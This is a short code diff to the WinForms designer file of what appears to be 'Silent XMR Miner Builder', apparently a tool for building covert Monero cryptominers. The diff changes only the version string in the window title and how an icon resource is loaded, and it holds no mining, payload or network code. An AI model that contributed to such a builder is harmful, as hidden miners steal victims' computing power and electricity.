@@ -346,7 +346,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent XMR Miner Builder 1.3.4"
+        Me.MephForm1.Text = "Silent XMR Miner Builder 1.4"
         '
         'MephTabcontrol2
         '
@@ -935,7 +935,7 @@ Partial Class Form1
         'picIcon
         '
         Me.picIcon.ErrorImage = Nothing
-        Me.picIcon.Image = Global.SilentXMRMiner.My.Resources.Resources.MoneroPNG
+        Me.picIcon.Image = CType(resources.GetObject("picIcon.Image"), System.Drawing.Image)
         Me.picIcon.InitialImage = Nothing
         Me.picIcon.Location = New System.Drawing.Point(160, 81)
         Me.picIcon.Margin = New System.Windows.Forms.Padding(2)
